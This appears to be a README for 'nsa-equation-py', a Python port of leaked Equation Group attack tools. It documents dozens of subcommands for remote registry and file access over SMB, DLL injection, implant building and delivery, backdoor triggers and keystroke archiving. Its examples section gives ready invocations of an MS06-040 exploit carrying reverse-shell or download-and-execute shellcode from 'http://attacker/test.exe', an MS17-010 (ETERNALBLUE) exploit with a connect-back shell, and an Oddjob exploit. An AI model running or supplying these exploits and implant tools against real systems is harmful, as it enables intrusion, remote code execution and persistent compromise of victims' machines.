Python 重写的 NSA Joblist (JOBLIST) AT 作业列表工具 Joblist-1.1.1。通过 SMB/ATSVC 协议列出目标主机上的所有定时任务。

## `makedmgd`

```text
usage: nsa-equation-py makedmgd [-h] [-o FILE] [-v] TYPE DIR
```

makedmgd — Oddjob ZiPo DMG 包打包工具。使用 UCL 数据压缩库打包 DMG 文件，支持多种包类型。

## `mofconfig`

```text
usage: nsa-equation-py mofconfig [-h] [--mof-file FILE] [--mof-compiler FILE] [--output-file FILE] [--remote-mof-path PATH] [--remote-dll-path PATH] [--remote-mof-trigger-path PATH] [-v]
```

Python 重写的 NSA Mofconfig (MOFConfig) 配置工具 Mofconfig-1.0.0。用于生成 MOF 配置文件以支持远程利用工具的后续投递。

## `ms06040rpc`

```text
usage: nsa-equation-py ms06040rpc [-h] [-u URL] [-r ADDR] [-p PORT] [-o OSTYPE] HOST
```

通过远程 \\<host>\pipe\BROWSER 命名管道绑定 Browser RPC 接口，发送 NetpwPathCanonicalize 溢出请求 (opnum 0x1F)，携带反弹 shell (reverse) 或 URL 下载执行 (download) 的 shellcode，针对 Win2000 SP4 / WinXP SP1。

## `ms06040rpc-unpacked-v2`

```text
usage: nsa-equation-py ms06040rpc-unpacked-v2 [-h] [-u URL] [-r ADDR] [-p PORT] [-o OSTYPE] [-P PORT] [-t TIMEOUT] HOST
```

针对 ms06040rpc_unpacked_v2.exe（经 IDA Pro + x32dbg 内存转储恢复）的 Python 重写。绑定 BROWSER RPC 接口（6a281939-0cb1-11d0-9ba8-00c04fd92ef5 / v0.0，字段按打印序大端存储），通过远程 \\<host>\pipe\BROWSER 命名管道发送 NetpwPathCanonicalize 溢出请求 (opnum 0x1F)，携带反弹 shell (reverse) 或 URL 下载执行 (download) 的 shellcode，针对 Win2000 SP4 / WinXP SP1。纯 stdlib（裸 SMBv1 客户端，与 impacket 帧逐字节兼容），无需 impacket。

## `ms06040rpc_dumped`

```text
usage: nsa-equation-py ms06040rpc_dumped [-h] [-u URL] [-r ADDR] [-p PORT] [-o OSTYPE] HOST
```

MS06-040 (NetApi32 NetpwPathCanonicalize) RPC 利用工具，内存 dumped（unpacked）变体。通过远程 \\<host>\pipe\BROWSER 命名管道绑定 Browser RPC 接口，发送 NetpwPathCanonicalize 溢出请求 (opnum 0x1F)，携带反弹 shell (reverse) 或 URL 下载执行 (download) 的 shellcode，针对 Win2000 SP4 / WinXP SP1。

## `ms06040rpc_unpacked`

```text
usage: nsa-equation-py ms06040rpc_unpacked [-h] [-u URL] [-r ADDR] [-p PORT] [-o OSTYPE] HOST
```

MS06-040 (NetApi32 NetpwPathCanonicalize) RPC 利用工具，unpacked 变体。通过远程 \\<host>\pipe\BROWSER 命名管道绑定 Browser RPC 接口，发送 NetpwPathCanonicalize 溢出请求 (opnum 0x1F)，携带反弹 shell (reverse) 或 URL 下载执行 (download) 的 shellcode，针对 Win2000 SP4 / WinXP SP1。

## `namedpipe-touch`

```text
usage: nsa-equation-py namedpipe-touch [-h] [-p PORT] [--timeout TIMEOUT] [--protocol {SMB,NBT}] [--pipe-list PIPES] [--desc-list DESCS] [-v] TARGET
```

Python 重写的 NSA Namedpipetouch (NamedPipeTouch) 命名管道触摸/探测工具 Namedpipetouch-2.0.0。通过 SMB/NBT 协议探测目标主机上的命名管道可达性，并识别对应的安全软件。

## `nameprobe`

```text
usage: nsa-equation-py nameprobe [-h] target_ip PORT
```

nameprobe — 向目标主机发起 TCP 连接，探测目标主机的网络服务状态和响应行为。

## `oddjob`

```text
usage: nsa-equation-py oddjob [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

oddjob — Oddjob (SMB) 利用，基于 nsa_equation/dave 统一协议库。

## `oddjob_config`

```text
usage: nsa-equation-py oddjob_config [-h] [-k HEX_KEY] [-n NAME] [-t TYPE] TEMPLATE_PE CONFIG_JSON OUTPUT_PE
```

Oddjob Config v3 — Equation Group Oddjob 植入的配置构建工具。加载模板 PE，加密配置数据，注入为 PE 资源，重算校验和，输出最终的 Oddjob 植入可执行文件。

## `oj_deleter`

```text
usage: nsa-equation-py oj_deleter [-h] [-d MS] [--debug] TARGET_PATH
```

OJ_Deleter_2.4 — Equation Group Oddjob 植入删除工具。删除目标路径指定的文件，使用 COM 初始化和 DeleteFileW。

## `papercut`

```text
usage: nsa-equation-py papercut [-h] [--get KEY] [--set KEY] [-l] [-v] CONFIG_FILE [VALUE]
```

PaperCut — 配置工具。使用 XML 配置文件读取和修改配置项，使用 KERNEL32 文件/服务/注册表操作、ADVAPI32 服务和注册表操作、USER32 消息框。

## `parsecapture`

```text
usage: nsa-equation-py parsecapture [-h] CAPTURE_FILE RESULTS_DIR [ENCRYPTION_KEY]
```

parsecapture — DSky/Darkskyline capture 文件解析器。支持 type 0/1/2 三种日志头部；type 2 段按 AES-128-ECB 解密（需要 16 字节 key）。

## `pc_lp`

```text
usage: nsa-equation-py pc_lp [-h] [-v] LISTEN_PORT [TARGET_HOST] [TARGET_PORT]
```

PC_LP — 监听/代理工具。使用 WS2_32 socket 监听和代理网络连接，使用 KERNEL32 进行文件和进程操作。

## `pccfg`

```text
usage: nsa-equation-py pccfg [-h] [--get KEY] [--set KEY] [-l] [-v] CONFIG_FILE [VALUE]
```

PCConfig — 配置工具。使用 XML 配置文件（xerces-c 库）读取和修改配置项，支持网络配置和文件操作。

## `pcconfig`

```text
usage: nsa-equation-py pcconfig [-h] [CONFIG_FILE]
```

pcconfig — 读取/配置 PC 套件相关配置。

## `pcdlllauncher`

```text
usage: nsa-equation-py pcdlllauncher [-h] [-p PORT] [--timeout TIMEOUT] [--lp-filename FILE] [--lp-entry-name NAME] [--implant-filename FILE] [--target-os-architecture {x86,x64}] [--pc-behavior {7,8}] [-v] TARGET
```

Python 重写的 NSA Pcdlllauncher (PCDLLLAUNCHER) 远程注入工具 Pcdlllauncher-2.3.1。通过 SMB/NBT 驱动，将 DLL 注入目标主机。

## `printjob-delete`

```text
usage: nsa-equation-py printjob-delete [-h] [-p PORT] [--timeout TIMEOUT] [--protocol {SMB,NBT}] [--credentials {Anonymous,Guest,No password,Password,NTLM hash,Both hashes}] [--username USER] [--password PASS] [--ntlm-hash HEX] [--lanman-hash HEX] [--printer-name NAME] [--job-id ID] [-v] TARGET
```

Python 重写的 NSA Printjobdelete (PrintJobDelete) 打印作业删除触摸工具 Printjobdelete-1.0.0。通过 SMB/NBT 协议删除目标打印机上的指定打印作业。

## `printjob-list`

```text
usage: nsa-equation-py printjob-list [-h] [-p PORT] [--timeout TIMEOUT] [--protocol {SMB,NBT}] [--credentials {Anonymous,Guest,No password,Password,NTLM hash,Both hashes}] [--username USER] [--password PASS] [--ntlm-hash HEX] [--lanman-hash HEX] [--printer-name NAME] [-v] TARGET
```

Python 重写的 NSA Printjoblist (PrintJobList) 打印作业列表触摸工具 Printjoblist-1.0.0。通过 SMB/NBT 协议列出目标打印机上的打印作业 ID。

## `process-list`

```text
usage: nsa-equation-py process-list [-h] [-p PORT] [--timeout TIMEOUT] [--auth-level {Default,None,Connect,Call,Packet,Integrity,Privacy}] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [--log-file FILE] [-v] TARGET
```

Python 重写的 NSA Processlist (PROCESSLIST) 远程进程列表工具 Processlist-1.1.1。通过 SMB/winreg 协议列出目标主机上的所有运行进程。

## `promiscdetect`

```text
usage: nsa-equation-py promiscdetect [-h] [-v] [ADAPTER]
```

PromiscDetect — 网卡混杂模式检测工具。使用 KERNEL32设备操作 (CreateFileA, DeviceIoControl) 和 ADVAPI32注册表操作检测目标机器网络适配器是否处于混杂模式。

## `rc5`

```text
usage: nsa-equation-py rc5 [-h] [-v] MODE SESSION_KEY CIPHERTEXT
```

RC5 — 加密/解密工具。使用 KERNEL32 (大量文件/内存操作)、USER32 (MessageBoxW)、MSVCRT (标准 C 运行时) 进行 RC5 加密/解密。

## `reg-delete`

```text
usage: nsa-equation-py reg-delete [-h] [-p PORT] [--timeout TIMEOUT] [--reg-hive {HKLM,HKU,HKPD,HKCU,HKCR}] [--reg-key KEY] [--type-to-delete {Key,Value}] [--entity-to-delete ENTITY] [--auth-level {Default,None,Connect,Call,Packet,Integrity,Privacy}] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [-v] TARGET
```

Python 重写的 NSA Regdelete (REGDELETE) 注册表删除工具 Regdelete-1.1.1。通过 SMB/ATSVC 协议删除目标主机注册表中的指定项或值。

## `reg-enum`

```text
usage: nsa-equation-py reg-enum [-h] [-p PORT] [--timeout TIMEOUT] [--reg-hive {HKLM,HKU,HKPD,HKCU,HKCR}] [--reg-key KEY] [--recursive] [--no-recursive] [--auth-level {Default,None,Connect,Call,Packet,Integrity,Privacy}] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [--log-file FILE] [-v] TARGET
```

Python 重写的 NSA Regenum (REGENUM) 注册表枚举工具 Regenum-1.1.1。通过 SMB/远程注册表 RPC 协议枚举目标主机注册表项和值。

## `reg-read`

```text
usage: nsa-equation-py reg-read [-h] [-p PORT] [--timeout TIMEOUT] [--reg-hive {HKLM,HKU,HKPD,HKCU,HKCR}] [--reg-key KEY] [--reg-value VALUE] [--auth-level {Default,None,Connect,Call,Packet,Integrity,Privacy}] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [-v] TARGET
```

Python 重写的 NSA Regread (REGREAD) 注册表读取工具 Regread-1.1.1。通过 SMB/远程注册表 RPC 协议读取目标主机注册表项的值。

## `reg-write`

```text
usage: nsa-equation-py reg-write [-h] [-p PORT] [--timeout TIMEOUT] [--reg-hive {HKLM,HKU,HKPD,HKCU,HKCR}] [--reg-key KEY] [--reg-type {Key,Value}] [--value-type {REG_NONE,REG_SZ,REG_EXPAND_SZ,REG_BINARY,REG_DWORD,REG_DWORD_LITTLE_ENDIAN,REG_DWORD_BIG_ENDIAN,REG_LINK,REG_MULTI_SZ,REG_RESOURCE_LIST,REG_FULL_RESOURCE_DESCIPTOR,REG_QWORD,REG_QWORD_LITTLE_ENDIAN}] [--value-name NAME] [--value-data DATA] [--key-name NAME] [--key-class CLASS] [--auth-level {Default,None,Connect,Call,Packet,Integrity,Privacy}] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [-v] TARGET
```

Python 重写的 NSA Regwrite (REGWRITE) 注册表写入工具 Regwrite-1.1.1。通过 SMB/远程注册表 RPC 协议在目标主机注册表中创建项或值。

## `regprobe`

```text
usage: nsa-equation-py regprobe [-h] TARGET [PORT]
```

regprobe — 探测目标主机的 RPC 端点映射器（默认 TCP 135），指纹识别操作系统版本并打印 RpcProxy 设置。

## `renamer`

```text
usage: nsa-equation-py renamer [-h] [-v] INPUT_FILE OUTPUT_FILE PATTERN [REPLACEMENT]
```

Renamer — 文件重命名工具。读取目录中的文件，应用重命名规则，写入结果，使用 KERNEL32 文件操作。

## `ridearea2`

```text
usage: nsa-equation-py ridearea2 [-h] -i FILE -o FILE [-x TYPE] [-d NAME] [-D] [-t OPT] [-f NUM] [-I IP] [-P PORT] [-a NUM] [-l OPT] [-v]
```

RideArea2 — 植入包装/加载器工具。支持从内存或磁盘加载植入负载，指定函数序数、IP 地址/端口、线程选项等。

## `rpc2`

```text
usage: nsa-equation-py rpc2 [-h] target_ip PORT [MODE]
```

rpc2 — 向目标主机的 RPC 端点映射器 (EPMapper, TCP 135) 发起探测请求，检测目标 RPC 服务状态、操作系统版本以及 RPC DCOM 漏洞补丁状态。

## `rpcproxy`

```text
usage: nsa-equation-py rpcproxy [-h] [-P TARGET_PORT] [--protocol {SMB,NBT}] [--version-major VERSION_MAJOR] [--version-minor VERSION_MINOR] [--server-name SERVER_NAME] [--client-name CLIENT_NAME] [--lp-filename LP_FILENAME] [--lp-entry-point LP_ENTRY_POINT] [--implant-filename IMPLANT_FILENAME] [--polling-interval POLLING_INTERVAL] [--network-timeout NETWORK_TIMEOUT] target_ip
```

rpcproxy — RPC proxy / implant delivery via BROWSER pipe. Port of Rpcproxy-1.0.1.exe. Uses SMB + RPC to bind to the target's BROWSER interface, then sends implant payloads (PayloadSize, PayloadChunk, PayloadLaunch) and optionally spawns a local plugin thread (LPEntryPoint).

## `rpctouch`

```text
usage: nsa-equation-py rpctouch [-h] [-P TARGET_PORT] [--protocol {SMB,NBT}] [--network-timeout NETWORK_TIMEOUT] [--netbios-name NETBIOS_NAME] [--touch-architecture {x86,x64,Unknown}] [--touch-language TOUCH_LANGUAGE] [--target-string TARGET_STRING] [--target-dword TARGET_DWORD] target_ip
```

rpctouch — RPC/architecture/probe (Rpctouch). Port of Rpctouch-2.1.0.exe. Detects target OS / service pack / language / architecture over SMB (\pipe\browser, spoolss strings) and computes potential non-paged-pool leak addresses used by MS08-067. Parameters: TargetIp, TargetPort, Protocol, NetworkTimeout, NetBIOSName, TouchArchitecture, TouchLanguage, Target(TargetString/TargetDWORD).

## `sc`

```text
usage: nsa-equation-py sc [-h] [--display-name NAME] [--bin-path PATH] [--start-type TYPE] [--error-control LEVEL] [--description TEXT] [--timeout SEC] [-v] SERVER COMMAND SERVICE [ARG ...]
```

sc — Windows 服务控制工具。通过 ADVAPI32 服务管理 API管理 Windows 服务，支持查询、创建、删除、启动、停止、配置等操作。

## `scanner`

```text
usage: nsa-equation-py scanner [-h] [-s TYPE] [-p PORT] [-o SEC] TARGET
```

scanner.exe — Equation Group 网络扫描工具，支持多种扫描类型：NetBIOS、X11、NTP、RPC、SNMP、Solaris、 echo、daytime、TFTP、IDENT、SMTP、FTP、TCP端口、HTTP、DNS、RIP、LPR、Telnet、Finger、SSL、SSH、 打印机(PJL)等。

## `sendcftrigger`

```text
usage: nsa-equation-py sendcftrigger [-h] TARGET [PORT] [CONFIG_FILE]
```

sendcftrigger — 读取 XML 配置文件，连接目标主机，发送触发请求。

## `sendddtrigger`

```text
usage: nsa-equation-py sendddtrigger [-h] TARGET [PORT]
```

sendddtrigger — 向目标主机的指定端口发送 DD 触发请求。

## `sendpctrigger`

```text
usage: nsa-equation-py sendpctrigger [-h] TARGET [PORT]
```

sendpctrigger — 向目标主机的指定端口发送 PC 触发请求。

## `sendpktrigger`

```text
usage: nsa-equation-py sendpktrigger [-h] TARGET [PORT]
```

sendpktrigger — 向目标主机的指定端口发送 PK 触发请求。

## `setcallback`

```text
usage: nsa-equation-py setcallback [-h] [-v] INPUT_FILE OUTPUT_FILE
```

SetCallback — 回调标志设置工具。读取输入文件，设置回调标志（Callback Flag），写入输出文件。

## `setcallbackports`

```text
usage: nsa-equation-py setcallbackports [-h] [-v] INPUT_FILE OUTPUT_FILE PORT [PORT ...]
```

SetCallbackPorts — 回调端口设置工具。在目标文件中设置回调端口（1-6个），使用 KERNEL32 文件操作。

## `setouraddr`

```text
usage: nsa-equation-py setouraddr [-h] [-v] INPUT_FILE OUTPUT_FILE PROTOCOL [ADDRESS]
```

SetOurAddr — 地址设置工具。在文件中替换默认 IP/IPX地址，使用 WS2_32 网络功能和 KERNEL32 文件操作。

## `setourip`

```text
usage: nsa-equation-py setourip [-h] input_file output_file [ip]
```

setourip — SetOurIp.exe 移植（LegacyWindowsExploits/Resources/Tools）。 原始 `SetOurIP <input file> <output file> [IP address]`：当前构建仅作为 CopyFileA 封装（"set of IP no longer done with this exe"），第三个 IP 参数 被解析但忽略。

## `setports`

```text
usage: nsa-equation-py setports [-h] [-v] INPUT_FILE OUTPUT_FILE VERSION PORT [PORT ...]
```

SetPorts — 端口设置工具。在目标文件中设置端口（1-5个），使用 KERNEL32 文件操作。

## `setresourcename`

```text
usage: nsa-equation-py setresourcename [-h] [-v] INPUT_FILE OUTPUT_FILE OLD_RESOURCE NEW_NAME
```

SetResourceName — 资源名称设置工具。在目标文件中替换资源名称（OriginalFilename 或 InternalName），使用KERNEL32 文件操作。

## `simrpc`

```text
usage: nsa-equation-py simrpc [-h] [-t] [-u] [-l] [-m] [-r NUM] [-q NUM] [-v] [-s] HOST [PROG] [VER]
```

simrpc — SIM RPC 信息查询工具，类似于 Unix 的 rpcinfo。通过 Winsock 查询目标主机上的 RPC 服务信息。

## `slDecoder`

```text
usage: nsa-equation-py slDecoder [-h] [-v] INPUT_FILE [OUTPUT_FILE]
```

SlDecoder — 二进制到 XML 解码工具。使用 KERNEL32 文件操作、MSVCRT/MSVCP60 (C++ 标准库)、Xml4_0u (XML 解析)、ole32(CoInitialize)、OLEAUT32 (SysAllocString, SysFreeString)、USER32 (MessageBoxW) 将二进制数据解码为 XML 格式。

## `smb-delete`

```text
usage: nsa-equation-py smb-delete [-h] [-p PORT] [--timeout TIMEOUT] [--share SHARE] [--path PATH] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [-v] TARGET
```

Python 重写的 NSA Smbdelete (SMBDELETE) SMB 文件删除工具 Smbdelete-1.1.1。通过 SMB 协议删除目标主机上的指定文件。

## `smb-list`

```text
usage: nsa-equation-py smb-list [-h] [-p PORT] [--timeout TIMEOUT] [--share SHARE] [--path PATH] [--filter FILTER] [--recursive] [--no-recursive] [--log-file FILE] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [-v] TARGET
```

Python 重写的 NSA Smblist (SMBLIST) SMB 目录列表工具 Smblist-1.1.1。通过 SMB 协议列出目标主机共享目录中的文件。

## `smb-read`

```text
usage: nsa-equation-py smb-read [-h] [-p PORT] [--timeout TIMEOUT] [--share SHARE] [--path PATH] [--destination DEST] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [-v] TARGET
```

Python 重写的 NSA Smbread (SMBREAD) SMB 文件读取工具 Smbread-1.1.1。通过 SMB 协议读取目标主机上的文件并保存到本地。

## `smb-touch`

```text
usage: nsa-equation-py smb-touch [-h] [-p PORT] [--timeout TIMEOUT] [--protocol {SMB,NBT}] [--pipe PIPE] [--share HEX] [--credentials {Anonymous,Guest,Blank,Password,NTLM}] [--username HEX] [--password HEX] [--ntlm-hash HEX] [-v] TARGET
```

Python 重写的 NSA Smbtouch (SMBTOUCH) SMB 会话探测工具 Smbtouch-1.1.1。通过 SMB/NBT 协议探测目标主机的 SMB 会话可达性、管道、共享和凭证。

## `smb-write`

```text
usage: nsa-equation-py smb-write [-h] [-p PORT] [--timeout TIMEOUT] [--share SHARE] [--path PATH] [--source SOURCE] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [-v] TARGET
```

Python 重写的 NSA Smbwrite (SMBWRITE) SMB 文件写入工具 Smbwrite-1.1.1。通过 SMB 协议上传本地文件到目标主机。

## `smbexp`

```text
usage: nsa-equation-py smbexp [-h] [-l LOCAL_IP] [-y] target backport
```

smbexp — Exploiting SMB (12008smbexp) 利用工具 Python 移植。 原始 `smbexp.exe <TagIp> <BackPort>`： 1. 向目标 445 发 SMB negotiate（106 字节），从响应推断“蓝屏风险”提示； 2. 分三阶段（70/86/195 次）发送 564 字节的 SMB 堆喷/乱序数据包 （byte[176] = 阶段号 0/1/2）； 3. 在 <BackPort> 监听反向 shell 连接，发送 322 字节 shellcode 后进入交互。 所有 SMB 载荷字节直接取自原 exe 的 .data 段（0x403010 / 0x4031A4 / 0x403210 / 0x40344C），未做任何二次打包。

## `st_lp`

```text
usage: nsa-equation-py st_lp [-h] TARGET [PORT]
```

st_lp — 与目标主机建立 TCP 连接，提供交互式命令行，支持 trigger/unload/kill/resend/buffer/ping/execute 等指令。

## `svctouch`

```text
usage: nsa-equation-py svctouch [-h] [-v] MACHINE CLSID
```

SvcTouch — 服务触摸/探测工具。使用 COM (CoInitialize/CoGetClassObject/CLSIDFromString) 检测目标机器上的 DCOM 服务或应用程序是否存在。

## `tacothief`

```text
usage: nsa-equation-py tacothief [-h] [-v] INPUT_FILE OUTPUT_FILE TARGET_FILE
```

Tacothief — 文件处理工具。读取输入文件，处理数据，写入输出文件，使用 KERNEL32 文件操作。

## `verpatch`

```text
usage: nsa-equation-py verpatch [-h] [--version VER] [--company NAME] [--product NAME] [--file-desc DESC] [--internal-name NAME] [--legal-copyright TEXT] [--checksum] [-v] PE_FILE
```

VerPatch — PE 版本修补工具。使用 imagehlp (MapAndLoad,CheckSumMappedFile) 和 VERSION.dll (GetFileVersionInfoW)修改 PE 文件的版本资源信息。

## `vlad`

```text
usage: nsa-equation-py vlad [-h] [-v] XML_FILE [SCHEMA_FILE]
```

Vlad — XML 验证工具。使用 OLE32 (CoCreateInstance, OleRun, CoInitialize)、OLEAUT32 (VariantClear, SysFreeString, SysAllocStringByteLen, SysAllocString,VariantChangeType, CreateErrorInfo, VariantInit, GetErrorInfo)、KERNEL32文件/内存操作、USER32 (wsprintfA, MessageBoxA) 验证 XML 文件。

## `w9xpopen`

```text
usage: nsa-equation-py w9xpopen [-h] [--show-errors] COMMAND [ARG ...]
```

w9xpopen — Windows 95/98 popen workaround tool. Runs a command and waits for it to complete, returning its exit code. Not designed for stand-alone use.

## `webadmin-touch`

```text
usage: nsa-equation-py webadmin-touch [-h] [-p PORT] [--timeout TIMEOUT] [--expected-protocol PROTO] [--expected-domain DOMAIN] [--expected-port PORT] [--target-acct-domain DOMAIN] [--target-acct-usr USER] [--target-acct-pwd PASS] [--supported-versions VERSIONS] [-v] TARGET
```

Python 重写的 NSA Webadmintouch (WebAdminTouch) Web 管理触摸/探测工具 Webadmintouch-1.0.1。通过 HTTP/SMTP 协议探测目标 WebAdmin 服务器版本和账户信息。

## `world-client-touch`

```text
usage: nsa-equation-py world-client-touch [-h] [-p PORT] [--timeout TIMEOUT] [--expected-protocol PROTO] [--expected-domain DOMAIN] [--expected-port PORT] [--target-acct-domain DOMAIN] [--target-acct-usr USER] [--target-acct-pwd PASS] [--supported-versions VERSIONS] [-v] TARGET
```

Python 重写的 NSA Worldclienttouch (WorldClientTouch) World Client 触摸/探测工具 Worldclienttouch-1.0.1。通过 HTTP/SMTP协议探测目标 WorldClient 服务器版本和账户信息。

## `xxxridearea`

```text
usage: nsa-equation-py xxxridearea [-h] MODE INPUT_FILE [OUTPUT_FILE]
```

xxxridearea — RideArea 文件处理工具。支持 single/multi 两种模式，对输入文件进行压缩/分段处理。

## `yak`

```text
usage: nsa-equation-py yak [-h] [-d] [-dp] [-t] [-ta] [-tau] [-xt] [-xta] [-xtu] [-s SIZE] [-f] [-w] [-lh] [-l LANGUAGE] [-v] ARCHIVE_FILE
```

Yak — 键盘监听/归档工具。使用 WS2_32 网络、KERNEL32文件和服务操作、ADVAPI32 服务和注册表操作、USER32键盘布局操作。支持键盘扫描码归档、转换和导出。


## Key subcommands (details)

### dns — DNS payload-builder (1MS07-029-DNS / dns.exe)

Python rewrite of the DNS payload-builder. Options are forwarded verbatim to `dns_tool`, e.g. `-y <payload> -R <ip> -p <port>`.

```bash
nsa-equation-py dns -y bind -R 1.2.3.4 -p 1100
nsa-equation-py dns --list
```

Run `nsa-equation-py dns --help` (via `dns_tool`) for all options.

### cve-2020-0796-scanner — CVE-2020-0796 (SMBGhost) detection

Scans targets (single IP or CIDR subnet) via SMB2 NEGOTIATE and reports hosts negotiating SMB 3.1.1 (0x0311). Detection only, no exploitation.

```bash
nsa-equation-py cve-2020-0796-scanner 192.168.1.5              # single host
nsa-equation-py cve-2020-0796-scanner 192.168.1.0/24           # whole subnet
nsa-equation-py cve-2020-0796-scanner 10.0.0.1 10.0.0.2 -p 445 -t 3 -n 64
```

### getarch — Host OS architecture probe (32/64-bit)

Probes the RPC Endpoint Mapper on TCP 135 and binds the portmapper UUID using NDR64 transfer syntax. 64-bit Windows accepts NDR64 → 64-bit; 32-bit rejects it → 32-bit. Dependency-free raw DCERPC BIND packet.

```bash
nsa-equation-py getarch -target 192.168.1.5              # single host
nsa-equation-py getarch -targets hosts.txt -timeout 2    # one host per line
```

### ms06040rpc — MS06-040 (NetApi32 NetpwPathCanonicalize) RPC exploit

Binds the Browser RPC interface over `\<host>\pipe\BROWSER` and fires a NetpwPathCanonicalize overflow (opnum 0x1F) with XOR-encoded shellcode. Requires `impacket`.

```bash
pip install impacket
nsa-equation-py ms06040rpc 192.168.1.5 -r 192.168.1.9 -p 4444 -o 1    # reverse shell (os_type 1)
nsa-equation-py ms06040rpc 192.168.1.5 -u http://attacker/test.exe -o 2 # download+exec (os_type 2)
```

### ms06040rpc-unpacked-v2 — MS06-040 RPC exploit (v2 build)

Same exploit family as `ms06040rpc`, but uses a dependency-free raw SMBv1 client and the BROWSER alias BIND abstract syntax.

```bash
nsa-equation-py ms06040rpc-unpacked-v2 192.168.1.5 -r 192.168.1.9 -p 4444 -o 1    # reverse shell (v2)
nsa-equation-py ms06040rpc-unpacked-v2 192.168.1.5 -u http://attacker/test.exe -o 2 # download+exec (v2)
```

### smbexp — MS17-010 (ETERNALBLUE) SMBv1 exploit

Dependency-free SMBv1 exploit with heap grooming and a connect-back stage.

```bash
nsa-equation-py smbexp 192.168.1.11 21            # listener on :21
nsa-equation-py smbexp 192.168.1.11 21 -l 10.0.0.5 -y
```

### setourip — SetOurIp.exe file-copy tool

Thin `CopyFileA` wrapper; the optional 3rd argument (IP) is parsed but ignored.

```bash
nsa-equation-py setourip in.bin out.bin
```

### oddjob — Oddjob (SMB) exploit / launcher

Oddjob v3 launcher built on the nsa_equation/dave protocol library.

```bash
nsa-equation-py oddjob 192.168.1.5 445   # listener on :445
nsa-equation-py oddjob 192.168.1.5 445 -l 10.0.0.5 -y
```

CLI: `oddjob <target_ip> [target_port] [callback_ip] [callback_port] [--groom N] [--max-attempts N] [--network-timeout N] [--xor-mask N]`

### ds_parselogs — DSky capture file splitter

Splits a capture file by standard pcap header (`D4C3 B2A1`) into `<results_prefix>_%02d.pcap`, verbatim. No XOR-0xE3 deobfuscation or AES decryption (that is `parsecapture`'s job).

```bash
nsa-equation-py ds_parselogs capture.bin results_prefix   # -> results_prefix_01.pcap, ...
```

### parsecapture — DSky capture parser / decryptor

Restores each capture segment to `capture_%02u.pcap`: type 0 verbatim, type 1 XOR-0xE3, type 2 AES-128-ECB (16-byte hex key, space-separated).

```bash
nsa-equation-py parsecapture capture.bin results_dir          # type 0/1, no key needed
nsa-equation-py parsecapture capture.bin results_dir "00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff"
```

## Coverage matrix

`re_project/coverage_matrix.md` provides a full coverage matrix over the 187 EXEs (153 unique MD5) in the project root:
- 16 subcommands ported (this CLI),
- "DAVE framework tools" (81, sharing the adfw/posh/tibe/trfo/trch/tucl protocol stack — a unified DAVE protocol library is suggested before porting),
- "independent self-developed tools" (oddjob/DSky/Df/Ep/GROK/PC suites, etc.),
- "third-party bundled tools" (nc/rar/reg/sc/wininst, etc., not ported).
